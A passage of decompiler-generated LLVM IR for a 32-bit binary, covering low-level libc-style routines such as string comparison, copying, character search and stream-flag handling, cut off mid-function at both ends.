dec_label_pc_8051537:                             ; preds = %dec_label_pc_80514fa
  %v8_8051537 = icmp sgt i32 %v3_8051532, %v4_8051532
  br i1 %v8_8051537, label %dec_label_pc_805153d, label %dec_label_pc_8051539

dec_label_pc_8051539:                             ; preds = %dec_label_pc_8051537
  %v1_8051539 = inttoptr i32 %v0_8051532 to i32*
  %v2_8051539 = load i32, i32* %v1_8051539, align 4
  %v3_8051539 = load i32, i32* %ecx.global-to-local, align 4
  %tmp14 = icmp ugt i32 %v2_8051539, %v3_8051539
  br i1 %tmp14, label %dec_label_pc_805153d, label %dec_label_pc_805153f

dec_label_pc_805153d:                             ; preds = %dec_label_pc_8051539, %dec_label_pc_8051537
  %v0_805153d = load i32, i32* %esi.global-to-local, align 4
  %v1_805153d = sub i32 0, %v0_805153d
  store i32 %v1_805153d, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_805153f

dec_label_pc_805153f:                             ; preds = %dec_label_pc_8051539, %dec_label_pc_80514fa, %dec_label_pc_805153d
  %v0_805153f = load i32, i32* %esi.global-to-local, align 4
  %v2_805153f = icmp slt i32 %v0_805153f, 0
  %v1_8051541 = icmp eq i1 %v2_805153f, false
  br i1 %v1_8051541, label %dec_label_pc_8051553, label %dec_label_pc_8051543

dec_label_pc_8051543:                             ; preds = %dec_label_pc_805153f
  %v1_8051543 = call i32 @function_804b774(i32 %v2_805151c)
  %v1_8051548 = inttoptr i32 %v1_8051543 to i32*
  store i32 75, i32* %v1_8051548, align 4
  %v0_8051556.pre = load i32, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8051553

dec_label_pc_8051550:                             ; preds = %dec_label_pc_80514df, %dec_label_pc_80514da
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8051553

dec_label_pc_8051553:                             ; preds = %dec_label_pc_805153f, %dec_label_pc_8051543, %dec_label_pc_8051550
  %v0_8051556 = phi i32 [ %v0_805153f, %dec_label_pc_805153f ], [ %v0_8051556.pre, %dec_label_pc_8051543 ], [ -1, %dec_label_pc_8051550 ]
  ret i32 %v0_8051556

; uselistorder directives
  uselistorder i32 %v4_8051532, { 1, 0 }
  uselistorder i32 %v3_8051532, { 1, 0 }
  uselistorder i32 %v1_80514d2, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v1_80514cb, { 4, 5, 3, 2, 1, 0 }
  uselistorder i32 %v2_80514c4, { 2, 1, 0, 3 }
  uselistorder i32 %tmp6, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i32* %esi.global-to-local, { 0, 2, 3, 1, 4, 5, 6 }
  uselistorder i32 75, { 1, 0 }
  uselistorder i32 2048, { 1, 0, 4, 2, 3 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8051553, { 2, 1, 0 }
  uselistorder label %dec_label_pc_805153f, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80514fa, { 4, 0, 1, 2, 3 }
}

define i32 @function_805155c(i32 %arg1) local_unnamed_addr {
dec_label_pc_805155c:
  %edx.global-to-local = alloca i32, align 4
  %v0_805155c = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_8051564 = add i32 %arg1, 8
  %v2_8051564 = inttoptr i32 %v1_8051564 to i32*
  %v3_8051564 = load i32, i32* %v2_8051564, align 4
  store i32 %v3_8051564, i32* %edx.global-to-local, align 4
  %v1_8051567 = add i32 %arg1, 12
  %v2_8051567 = inttoptr i32 %v1_8051567 to i32*
  %v3_8051567 = load i32, i32* %v2_8051567, align 4
  %v2_805156a = sub i32 %v3_8051567, %v3_8051564
  %v3_805156f = inttoptr i32 %arg1 to i16*
  %v4_805156f = call i32 @function_8051470(i16* %v3_805156f, i32 %v3_8051564, i32 %v2_805156a)
  %v0_8051574 = load i32, i32* @ebx, align 4
  %v1_8051574 = add i32 %v0_8051574, 8
  %v2_8051574 = inttoptr i32 %v1_8051574 to i32*
  %v3_8051574 = load i32, i32* %v2_8051574, align 4
  store i32 %v3_8051574, i32* %edx.global-to-local, align 4
  %v2_8051577 = add i32 %v0_8051574, 16
  %v3_8051577 = inttoptr i32 %v2_8051577 to i32*
  store i32 %v3_8051574, i32* %v3_8051577, align 4
  %v0_805157a = load i32, i32* %edx.global-to-local, align 4
  %v2_805157a = add i32 %v0_805157a, %v4_805156f
  store i32 %v2_805157a, i32* %edx.global-to-local, align 4
  %v1_805157c = load i32, i32* @ebx, align 4
  %v2_805157c = add i32 %v1_805157c, 20
  %v3_805157c = inttoptr i32 %v2_805157c to i32*
  store i32 %v2_805157a, i32* %v3_805157c, align 4
  store i32 %v0_805155c, i32* @ebx, align 4
  ret i32 %v4_805156f

; uselistorder directives
  uselistorder i32 %v4_805156f, { 1, 0 }
  uselistorder i32 %arg1, { 0, 3, 2, 1 }
}

define i32 @function_8051584(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8051584:
  %v0_8051584 = load i32, i32* @ebx, align 4
  %v4_8051588 = ptrtoint i16* %arg1 to i32
  store i32 %v4_8051588, i32* @ebx, align 4
  store i32 %arg2, i32* @ecx, align 4
  %v1_8051590 = bitcast i16* %arg1 to i32*
  %v2_8051590 = load i32, i32* %v1_8051590, align 4
  %v1_8051592 = urem i32 %v2_8051590, 65536
  %v2_8051595 = and i32 %v1_8051592, %arg2
  %v3_8051595 = icmp eq i32 %v2_8051595, 0
  %v1_8051597 = icmp eq i1 %v3_8051595, false
  br i1 %v1_8051597, label %dec_label_pc_80515a6, label %dec_label_pc_8051599

dec_label_pc_8051599:                             ; preds = %dec_label_pc_8051584
  %v1_8051599 = and i32 %v2_8051590, 2176
  %v2_8051599 = icmp eq i32 %v1_8051599, 0
  %v1_805159f = icmp eq i1 %v2_8051599, false
  br i1 %v1_805159f, label %dec_label_pc_80515ad, label %dec_label_pc_80515a1

dec_label_pc_80515a1:                             ; preds = %dec_label_pc_8051599
  %v2_80515a1 = or i32 %v2_8051590, %arg2
  %v1_80515a3 = trunc i32 %v2_80515a1 to i16
  store i16 %v1_80515a3, i16* %arg1, align 2
  %v0_80515a6.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_80515a6

dec_label_pc_80515a6:                             ; preds = %dec_label_pc_8051584, %dec_label_pc_80515a1
  %v0_80515c8 = phi i32 [ %v4_8051588, %dec_label_pc_8051584 ], [ %v0_80515a6.pre, %dec_label_pc_80515a1 ]
  %v1_80515a6 = inttoptr i32 %v0_80515c8 to i16*
  %v2_80515a6 = load i16, i16* %v1_80515a6, align 2
  %v2_80515a9 = and i16 %v2_80515a6, 16
  %v3_80515a9 = icmp eq i16 %v2_80515a9, 0
  br i1 %v3_80515a9, label %dec_label_pc_80515c1, label %dec_label_pc_80515ad

dec_label_pc_80515ad:                             ; preds = %dec_label_pc_80515a6, %dec_label_pc_8051599
  %v1_80515ad = call i32 @function_804b774(i32 %v0_8051584)
  %v1_80515b2 = inttoptr i32 %v1_80515ad to i32*
  store i32 9, i32* %v1_80515b2, align 4
  br label %dec_label_pc_80515b8

dec_label_pc_80515b8:                             ; preds = %dec_label_pc_80515c5, %dec_label_pc_80515ad
  %v0_80515b8 = load i32, i32* @ebx, align 4
  %v1_80515b8 = inttoptr i32 %v0_80515b8 to i16*
  %v2_80515b8 = load i16, i16* %v1_80515b8, align 2
  %v3_80515b8 = or i16 %v2_80515b8, 8
  store i16 %v3_80515b8, i16* %v1_80515b8, align 2
  br label %dec_label_pc_80515e5

dec_label_pc_80515c1:                             ; preds = %dec_label_pc_80515a6
  %v2_80515c1 = and i16 %v2_80515a6, 64
  %v3_80515c1 = icmp eq i16 %v2_80515c1, 0
  br i1 %v3_80515c1, label %dec_label_pc_80515df, label %dec_label_pc_80515c5

dec_label_pc_80515c5:                             ; preds = %dec_label_pc_80515c1
  %v2_80515c9 = call i32 @function_804bf78(i32 %v0_80515c8)
  %v1_80515d1 = icmp eq i32 %v2_80515c9, 0
  %v1_80515d3 = icmp eq i1 %v1_80515d1, false
  br i1 %v1_80515d3, label %dec_label_pc_80515b8, label %dec_label_pc_80515d5

dec_label_pc_80515d5:                             ; preds = %dec_label_pc_80515c5
  %v0_80515d5 = load i32, i32* @ebx, align 4
  %v1_80515d5 = inttoptr i32 %v0_80515d5 to i16*
  %v2_80515d5 = load i16, i16* %v1_80515d5, align 2
  %v3_80515d5 = and i16 %v2_80515d5, -65
  store i16 %v3_80515d5, i16* %v1_80515d5, align 2
  %v0_80515d9 = load i32, i32* @ebx, align 4
  %v1_80515d9 = add i32 %v0_80515d9, 8
  %v2_80515d9 = inttoptr i32 %v1_80515d9 to i32*
  %v3_80515d9 = load i32, i32* %v2_80515d9, align 4
  %v2_80515dc = add i32 %v0_80515d9, 28
  %v3_80515dc = inttoptr i32 %v2_80515dc to i32*
  store i32 %v3_80515d9, i32* %v3_80515dc, align 4
  %v0_80515df.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_80515df

dec_label_pc_80515df:                             ; preds = %dec_label_pc_80515c1, %dec_label_pc_80515d5
  %v9_80515df = phi i32 [ %v0_80515c8, %dec_label_pc_80515c1 ], [ %v0_80515df.pre, %dec_label_pc_80515d5 ]
  %v1_80515df = inttoptr i32 %v9_80515df to i16*
  %v2_80515df = load i16, i16* %v1_80515df, align 2
  %v3_80515df = or i16 %v2_80515df, 1
  store i16 %v3_80515df, i16* %v1_80515df, align 2
  br label %dec_label_pc_80515e5

dec_label_pc_80515e5:                             ; preds = %dec_label_pc_80515b8, %dec_label_pc_80515df
  %storemerge = phi i32 [ 0, %dec_label_pc_80515df ], [ -1, %dec_label_pc_80515b8 ]
  store i32 %v0_8051584, i32* @ebx, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v2_8051590, { 1, 2, 0 }
  uselistorder i32 %v0_8051584, { 1, 0 }
  uselistorder i16 1, { 2, 1, 0 }
  uselistorder i32 (i32)* @function_804bf78, { 6, 3, 2, 1, 8, 7, 5, 4, 0 }
  uselistorder i16 8, { 2, 3, 0, 4, 6, 1, 5 }
  uselistorder i16 0, { 0, 6, 1, 7, 4, 5, 8, 9, 10, 2, 3 }
  uselistorder i16* %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_80515e5, { 1, 0 }
  uselistorder label %dec_label_pc_80515df, { 1, 0 }
  uselistorder label %dec_label_pc_80515a6, { 1, 0 }
}

define i32 @function_80515ec(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_80515ec:
  %tmp5 = ptrtoint i32* %arg2 to i32
  store i32 %tmp5, i32* @ebx, align 4
  %v1_80515f8 = add i32 %tmp5, 4
  %v2_80515f8 = inttoptr i32 %v1_80515f8 to i32*
  %v3_80515f8 = load i32, i32* %v2_80515f8, align 4
  %v2_80515fb = load i32, i32* %arg2, align 4
  %v1_8051601 = add i32 %arg1, 4
  %v2_8051601 = inttoptr i32 %v1_8051601 to i32*
  %v3_8051601 = load i32, i32* %v2_8051601, align 4
  %v4_8051604 = call i32 @function_8052208(i32 %v3_8051601, i32 %v2_80515fb, i32 %v3_80515f8, i32 %arg3)
  %v0_805160e = load i32, i32* @edx, align 4
  %v2_805160e = icmp slt i32 %v0_805160e, 0
  br i1 %v2_805160e, label %dec_label_pc_8051619, label %dec_label_pc_8051612

dec_label_pc_8051612:                             ; preds = %dec_label_pc_80515ec
  %v1_8051612 = load i32, i32* @ebx, align 4
  %v2_8051612 = inttoptr i32 %v1_8051612 to i32*
  store i32 %v4_8051604, i32* %v2_8051612, align 4
  %v0_8051614 = load i32, i32* @edx, align 4
  %v1_8051614 = load i32, i32* @ebx, align 4
  %v2_8051614 = add i32 %v1_8051614, 4
  %v3_8051614 = inttoptr i32 %v2_8051614 to i32*
  store i32 %v0_8051614, i32* %v3_8051614, align 4
  br label %dec_label_pc_8051619

dec_label_pc_8051619:                             ; preds = %dec_label_pc_80515ec, %dec_label_pc_8051612
  %v0_8051619 = phi i32 [ %v4_8051604, %dec_label_pc_80515ec ], [ 0, %dec_label_pc_8051612 ]
  ret i32 %v0_8051619

; uselistorder directives
  uselistorder i32 %tmp5, { 1, 0 }
  uselistorder label %dec_label_pc_8051619, { 1, 0 }
}

define i32 @function_8051620(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8051620:
  %v4_8051622 = ptrtoint i8* %arg1 to i32
  %v4_805162a.pre = load i32, i32* @eax, align 4
  %v8_805162a.pre = load i1, i1* @df, align 1
  %v9_805162a = select i1 %v8_805162a.pre, i32 -1, i32 1
  br label %dec_label_pc_805162a

dec_label_pc_805162a:                             ; preds = %dec_label_pc_805162e, %dec_label_pc_8051620
  %v20_805162b = phi i32 [ %v23_805162b, %dec_label_pc_805162e ], [ %arg2, %dec_label_pc_8051620 ]
  %v4_805162a = phi i32 [ %v6_805162a, %dec_label_pc_805162e ], [ %v4_805162a.pre, %dec_label_pc_8051620 ]
  %v7_805162a = phi i32 [ %v10_805162a, %dec_label_pc_805162e ], [ %v4_8051622, %dec_label_pc_8051620 ]
  %v1_805162a = inttoptr i32 %v7_805162a to i8*
  %v2_805162a = load i8, i8* %v1_805162a, align 1
  %v3_805162b = inttoptr i32 %v20_805162b to i8*
  %v4_805162b = load i8, i8* %v3_805162b, align 1
  %v15_805162b = icmp eq i8 %v2_805162a, %v4_805162b
  %v1_805162c = icmp eq i1 %v15_805162b, false
  br i1 %v1_805162c, label %dec_label_pc_8051636, label %dec_label_pc_805162e

dec_label_pc_805162e:                             ; preds = %dec_label_pc_805162a
  %v3_805162a = zext i8 %v2_805162a to i32
  %v5_805162a = and i32 %v4_805162a, -256
  %v6_805162a = or i32 %v3_805162a, %v5_805162a
  %v23_805162b = add i32 %v20_805162b, %v9_805162a
  %v10_805162a = add i32 %v7_805162a, %v9_805162a
  %v4_805162e = icmp eq i8 %v2_805162a, 0
  %v1_8051630 = icmp eq i1 %v4_805162e, false
  br i1 %v1_8051630, label %dec_label_pc_805162a, label %dec_label_pc_805163a

dec_label_pc_8051636:                             ; preds = %dec_label_pc_805162a
  br label %dec_label_pc_805163a

dec_label_pc_805163a:                             ; preds = %dec_label_pc_805162e, %dec_label_pc_8051636
  %storemerge = phi i32 [ 1, %dec_label_pc_8051636 ], [ 0, %dec_label_pc_805162e ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i8 %v2_805162a, { 1, 2, 0 }
  uselistorder i32 %v9_805162a, { 1, 0 }
  uselistorder label %dec_label_pc_805163a, { 1, 0 }
}

define i32 @function_8051640() local_unnamed_addr {
dec_label_pc_8051640:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i8* @__decompiler_undefined_function_1()
  %stack_var_-8 = alloca i32, align 4
  %v0_8051641 = load i32, i32* @esi, align 4
  store i32 %v0_8051641, i32* %stack_var_-8, align 4
  %v4_8051642 = ptrtoint i8* %tmp5 to i32
  store i32 %v4_8051642, i32* %esi.global-to-local, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %ecx.global-to-local, align 4
  %v4_805164f = inttoptr i32 %tmp to i8*
  store i32 %tmp, i32* %edi.global-to-local, align 4
  %v3_8051653 = call i32 @_strlen(i8* %v4_805164f)
  %v2_8051655 = add i32 %tmp, -1
  store i32 %v2_8051655, i32* %edi.global-to-local, align 4
  %v0_8051656 = load i32, i32* %edx.global-to-local, align 4
  %v8_805165910 = icmp eq i32 %v0_8051656, 0
  store i32 %v0_8051656, i32* %ecx.global-to-local, align 4
  br i1 %v8_805165910, label %dec_label_pc_8051664, label %dec_label_pc_805165c.lr.ph

dec_label_pc_805165c.lr.ph:                       ; preds = %dec_label_pc_8051640
  %v4_805165c.pre = load i32, i32* %eax.global-to-local, align 4
  %v8_805165c.pre = load i1, i1* @df, align 1
  br label %dec_label_pc_805165c

dec_label_pc_805165c:                             ; preds = %dec_label_pc_805165c.lr.ph, %dec_label_pc_805165c.dec_label_pc_8051659_crit_edge
  %v8_805165c = phi i1 [ %v8_805165c.pre, %dec_label_pc_805165c.lr.ph ], [ %v5_805165d, %dec_label_pc_805165c.dec_label_pc_8051659_crit_edge ]
  %v4_805165c = phi i32 [ %v4_805165c.pre, %dec_label_pc_805165c.lr.ph ], [ %v0_805165e, %dec_label_pc_805165c.dec_label_pc_8051659_crit_edge ]
  %v2_805166611 = phi i32 [ %v2_8051655, %dec_label_pc_805165c.lr.ph ], [ %v7_805165d, %dec_label_pc_805165c.dec_label_pc_8051659_crit_edge ]
  %v0_805165c = load i32, i32* %esi.global-to-local, align 4
  %v1_805165c = inttoptr i32 %v0_805165c to i8*
  %v2_805165c = load i8, i8* %v1_805165c, align 1
  %v3_805165c = zext i8 %v2_805165c to i32
  %v5_805165c = and i32 %v4_805165c, -256
  %v6_805165c = or i32 %v5_805165c, %v3_805165c
  store i32 %v6_805165c, i32* %eax.global-to-local, align 4
  %v9_805165c = select i1 %v8_805165c, i32 -1, i32 1
  %v10_805165c = add i32 %v9_805165c, %v0_805165c
  store i32 %v10_805165c, i32* %esi.global-to-local, align 4
  %v3_805165d = inttoptr i32 %v2_805166611 to i8*
  store i8 %v2_805165c, i8* %v3_805165d, align 1
  %v4_805165d = load i32, i32* %edi.global-to-local, align 4
  %v5_805165d = load i1, i1* @df, align 1
  %v6_805165d = select i1 %v5_805165d, i32 -1, i32 1
  %v7_805165d = add i32 %v6_805165d, %v4_805165d
  store i32 %v7_805165d, i32* %edi.global-to-local, align 4
  %v0_805165e = load i32, i32* %eax.global-to-local, align 4
  %v3_805165e = trunc i32 %v0_805165e to i8
  %v4_805165e = icmp eq i8 %v3_805165e, 0
  %v1_8051660 = icmp eq i1 %v4_805165e, false
  br i1 %v1_8051660, label %dec_label_pc_805165c.dec_label_pc_8051659_crit_edge, label %dec_label_pc_8051667

dec_label_pc_805165c.dec_label_pc_8051659_crit_edge: ; preds = %dec_label_pc_805165c
  %v0_8051659.pre = load i32, i32* %ecx.global-to-local, align 4
  %v1_8051659 = add i32 %v0_8051659.pre, -1
  %v8_8051659 = icmp eq i32 %v1_8051659, 0
  store i32 %v1_8051659, i32* %ecx.global-to-local, align 4
  br i1 %v8_8051659, label %dec_label_pc_8051664, label %dec_label_pc_805165c

dec_label_pc_8051664:                             ; preds = %dec_label_pc_805165c.dec_label_pc_8051659_crit_edge, %dec_label_pc_8051640
  %v2_8051666.lcssa = phi i32 [ %v2_8051655, %dec_label_pc_8051640 ], [ %v7_805165d, %dec_label_pc_805165c.dec_label_pc_8051659_crit_edge ]
  store i32 0, i32* %eax.global-to-local, align 4
  %v3_8051666 = inttoptr i32 %v2_8051666.lcssa to i8*
  store i8 0, i8* %v3_8051666, align 1
  %v4_8051666 = load i32, i32* %edi.global-to-local, align 4
  %v5_8051666 = load i1, i1* @df, align 1
  %v6_8051666 = select i1 %v5_8051666, i32 -1, i32 1
  %v7_8051666 = add i32 %v6_8051666, %v4_8051666
  store i32 %v7_8051666, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8051667

dec_label_pc_8051667:                             ; preds = %dec_label_pc_805165c, %dec_label_pc_8051664
  store i32 %tmp, i32* %eax.global-to-local, align 4
  %v2_805166b = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_805166b, i32* @esi, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %v1_8051659, { 1, 0 }
  uselistorder i32 %v0_805165e, { 1, 0 }
  uselistorder i32 %v7_805165d, { 0, 2, 1 }
  uselistorder i1 %v5_805165d, { 1, 0 }
  uselistorder i32 %tmp, { 4, 3, 0, 1, 2 }
  uselistorder i32* %edi.global-to-local, { 0, 2, 1, 3, 4, 5 }
  uselistorder i32* %ecx.global-to-local, { 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_8051667, { 1, 0 }
  uselistorder label %dec_label_pc_805165c, { 1, 0 }
}

define i32 @function_8051670(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8051670:
  %v0_8051671 = load i32, i32* @ebx, align 4
  %v4_8051672 = urem i32 %arg2, 256
  %v4_8051676 = ptrtoint i8* %arg1 to i32
  %v2_80516813 = urem i32 %v4_8051676, 4
  %v3_80516814 = icmp eq i32 %v2_80516813, 0
  %v1_80516838 = icmp eq i1 %v3_80516814, false
  %v4_805167c = trunc i32 %arg2 to i8
  br i1 %v1_80516838, label %dec_label_pc_805167c, label %dec_label_pc_8051685

dec_label_pc_805167c:                             ; preds = %dec_label_pc_8051670, %dec_label_pc_8051680
  %v0_8051680 = phi i32 [ %v1_8051680, %dec_label_pc_8051680 ], [ %v4_8051676, %dec_label_pc_8051670 ]
  %v1_805167c = inttoptr i32 %v0_8051680 to i8*
  %v2_805167c = load i8, i8* %v1_805167c, align 1
  %v15_805167c = icmp eq i8 %v2_805167c, %v4_805167c
  br i1 %v15_805167c, label %dec_label_pc_80516d0, label %dec_label_pc_8051680

dec_label_pc_8051680:                             ; preds = %dec_label_pc_805167c
  %v1_8051680 = add i32 %v0_8051680, 1
  %v2_8051681 = urem i32 %v1_8051680, 4
  %v3_8051681 = icmp eq i32 %v2_8051681, 0
  %v1_8051683 = icmp eq i1 %v3_8051681, false
  br i1 %v1_8051683, label %dec_label_pc_805167c, label %dec_label_pc_8051685

dec_label_pc_8051685:                             ; preds = %dec_label_pc_8051670, %dec_label_pc_8051680
  %v0_8051688 = phi i32 [ %v1_8051680, %dec_label_pc_8051680 ], [ %v4_8051676, %dec_label_pc_8051670 ]
  %v2_805168c = mul nuw nsw i32 %v4_8051672, 256
  %v2_805168f = or i32 %v2_805168c, %v4_8051672
  %v2_8051693 = mul i32 %v2_805168f, 65536
  %v2_8051696 = or i32 %v2_8051693, %v2_805168f
  br label %dec_label_pc_8051698

dec_label_pc_8051698:                             ; preds = %dec_label_pc_80516c8, %dec_label_pc_8051698, %dec_label_pc_8051685
  %v0_805169c = phi i32 [ %v0_8051688, %dec_label_pc_8051685 ], [ %v1_805169c, %dec_label_pc_8051698 ], [ %v1_805169c, %dec_label_pc_80516c8 ]
  %v2_805169a = inttoptr i32 %v0_805169c to i32*
  %v3_805169a = load i32, i32* %v2_805169a, align 4
  %v4_805169a = xor i32 %v3_805169a, %v2_8051696
  %v1_805169c = add i32 %v0_805169c, 4
  %v1_805169f = add i32 %v4_805169a, 2130640639
  %v1_80516a5 = sub i32 -1, %v4_805169a
  %v2_80516a7 = xor i32 %v1_805169f, %v1_80516a5
  %v1_80516a9 = and i32 %v2_80516a7, -2130640640
  %v2_80516a9 = icmp eq i32 %v1_80516a9, 0
  br i1 %v2_80516a9, label %dec_label_pc_8051698, label %dec_label_pc_80516b0

dec_label_pc_80516b0:                             ; preds = %dec_label_pc_8051698
  %v2_80516b3 = inttoptr i32 %v0_805169c to i8*
  %v3_80516b3 = load i8, i8* %v2_80516b3, align 1
  %v16_80516b3 = icmp eq i8 %v3_80516b3, %v4_805167c
  br i1 %v16_80516b3, label %dec_label_pc_80516d0, label %dec_label_pc_80516b8

dec_label_pc_80516b8:                             ; preds = %dec_label_pc_80516b0
  %v1_80516b8 = add i32 %v0_805169c, 1
  %v2_80516bb = inttoptr i32 %v1_80516b8 to i8*
  %v3_80516bb = load i8, i8* %v2_80516bb, align 1
  %v16_80516bb = icmp eq i8 %v3_80516bb, %v4_805167c
  br i1 %v16_80516bb, label %dec_label_pc_80516d0, label %dec_label_pc_80516c0

dec_label_pc_80516c0:                             ; preds = %dec_label_pc_80516b8
  %v1_80516c0 = add i32 %v0_805169c, 2
  %v2_80516c3 = inttoptr i32 %v1_80516c0 to i8*
  %v3_80516c3 = load i8, i8* %v2_80516c3, align 1
  %v16_80516c3 = icmp eq i8 %v3_80516c3, %v4_805167c
  br i1 %v16_80516c3, label %dec_label_pc_80516d0, label %dec_label_pc_80516c8

dec_label_pc_80516c8:                             ; preds = %dec_label_pc_80516c0
  %v1_80516c8 = add i32 %v0_805169c, 3
  %v2_80516cb = inttoptr i32 %v1_80516c8 to i8*
  %v3_80516cb = load i8, i8* %v2_80516cb, align 1
  %v16_80516cb = icmp eq i8 %v3_80516cb, %v4_805167c
  %v1_80516ce = icmp eq i1 %v16_80516cb, false
  br i1 %v1_80516ce, label %dec_label_pc_8051698, label %dec_label_pc_80516d0

dec_label_pc_80516d0:                             ; preds = %dec_label_pc_805167c, %dec_label_pc_80516c8, %dec_label_pc_80516c0, %dec_label_pc_80516b8, %dec_label_pc_80516b0
  %v0_80516d2 = phi i32 [ %v1_80516c8, %dec_label_pc_80516c8 ], [ %v1_80516c0, %dec_label_pc_80516c0 ], [ %v1_80516b8, %dec_label_pc_80516b8 ], [ %v0_805169c, %dec_label_pc_80516b0 ], [ %v0_8051680, %dec_label_pc_805167c ]
  store i32 %v0_8051671, i32* @ebx, align 4
  ret i32 %v0_80516d2

; uselistorder directives
  uselistorder i32 %v1_805169c, { 1, 0 }
  uselistorder i32 %v2_805168f, { 1, 0 }
  uselistorder i32 %v1_8051680, { 1, 0, 2 }
  uselistorder i32 %v4_8051676, { 2, 1, 0 }
  uselistorder i32 %v4_8051672, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_80516d0, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_8051685, { 1, 0 }
  uselistorder label %dec_label_pc_805167c, { 1, 0 }
}

define i32 @function_80516d4(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_80516d4:
  %v2_80516f630 = load i8, i8* %arg1, align 1
  %v4_80516f834 = icmp eq i8 %v2_80516f630, 0
  br i1 %v4_80516f834, label %dec_label_pc_8051700, label %dec_label_pc_80516fc.lr.ph

dec_label_pc_80516fc.lr.ph:                       ; preds = %dec_label_pc_80516d4
  %v3_80516f631 = zext i8 %v2_80516f630 to i32
  %v4_80516f6.pre = load i32, i32* @eax, align 4
  %v5_80516f632 = and i32 %v4_80516f6.pre, -256
  %v6_80516f633 = or i32 %v3_80516f631, %v5_80516f632
  %v4_80516dd = ptrtoint i8* %arg1 to i32
  %v1_80516e818 = inttoptr i32 %arg2 to i8*
  %v4_80516e8.pre.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_80516fc

dec_label_pc_80516e3:                             ; preds = %dec_label_pc_80516fc, %dec_label_pc_80516e7
  %v6_80516e827 = phi i32 [ %v6_80516e8, %dec_label_pc_80516e7 ], [ %v6_80516e822, %dec_label_pc_80516fc ]
  %v2_80516e826 = phi i8 [ %v2_80516e8, %dec_label_pc_80516e7 ], [ %v2_80516e819, %dec_label_pc_80516fc ]
  %v0_80516e725 = phi i32 [ %v1_80516e7, %dec_label_pc_80516e7 ], [ %arg2, %dec_label_pc_80516fc ]
  %v15_80516e3 = icmp eq i8 %v2_80516f637, %v2_80516e826
  br i1 %v15_80516e3, label %dec_label_pc_80516f0, label %dec_label_pc_80516e7

dec_label_pc_80516e7:                             ; preds = %dec_label_pc_80516e3
  %v1_80516e7 = add i32 %v0_80516e725, 1
  store i32 %v1_80516e7, i32* @edx, align 4
  %v1_80516e8 = inttoptr i32 %v1_80516e7 to i8*
  %v2_80516e8 = load i8, i8* %v1_80516e8, align 1
  %v3_80516e8 = zext i8 %v2_80516e8 to i32
  %v5_80516e8 = and i32 %v6_80516e827, -256
  %v6_80516e8 = or i32 %v3_80516e8, %v5_80516e8
  store i32 %v6_80516e8, i32* @ecx, align 4
  %v4_80516ea = icmp eq i8 %v2_80516e8, 0
  %v1_80516ec = icmp eq i1 %v4_80516ea, false
  br i1 %v1_80516ec, label %dec_label_pc_80516e3, label %dec_label_pc_8051700

dec_label_pc_80516f0:                             ; preds = %dec_label_pc_80516e3
  %v1_80516f4 = add i32 %v0_805170035, 1
  %v1_80516f5 = add i32 %v0_80516f536, 1
  %v1_80516f6 = inttoptr i32 %v1_80516f5 to i8*
  %v2_80516f6 = load i8, i8* %v1_80516f6, align 1
  %v3_80516f6 = zext i8 %v2_80516f6 to i32
  %v5_80516f6 = and i32 %v6_80516f638, -256
  %v6_80516f6 = or i32 %v3_80516f6, %v5_80516f6
  %v4_80516f8 = icmp eq i8 %v2_80516f6, 0
  br i1 %v4_80516f8, label %dec_label_pc_8051700, label %dec_label_pc_80516fc

dec_label_pc_80516fc:                             ; preds = %dec_label_pc_80516fc.lr.ph, %dec_label_pc_80516f0
  %v4_80516e8.pre = phi i32 [ %v4_80516e8.pre.pre, %dec_label_pc_80516fc.lr.ph ], [ %v6_80516e827, %dec_label_pc_80516f0 ]
  %v6_80516f638 = phi i32 [ %v6_80516f633, %dec_label_pc_80516fc.lr.ph ], [ %v6_80516f6, %dec_label_pc_80516f0 ]
  %v2_80516f637 = phi i8 [ %v2_80516f630, %dec_label_pc_80516fc.lr.ph ], [ %v2_80516f6, %dec_label_pc_80516f0 ]
  %v0_80516f536 = phi i32 [ %v4_80516dd, %dec_label_pc_80516fc.lr.ph ], [ %v1_80516f5, %dec_label_pc_80516f0 ]
  %v0_805170035 = phi i32 [ 0, %dec_label_pc_80516fc.lr.ph ], [ %v1_80516f4, %dec_label_pc_80516f0 ]
  store i32 %arg2, i32* @edx, align 4
  %v2_80516e819 = load i8, i8* %v1_80516e818, align 1
  %v3_80516e820 = zext i8 %v2_80516e819 to i32
  %v5_80516e821 = and i32 %v4_80516e8.pre, -256
  %v6_80516e822 = or i32 %v3_80516e820, %v5_80516e821
  store i32 %v6_80516e822, i32* @ecx, align 4
  %v4_80516ea23 = icmp eq i8 %v2_80516e819, 0
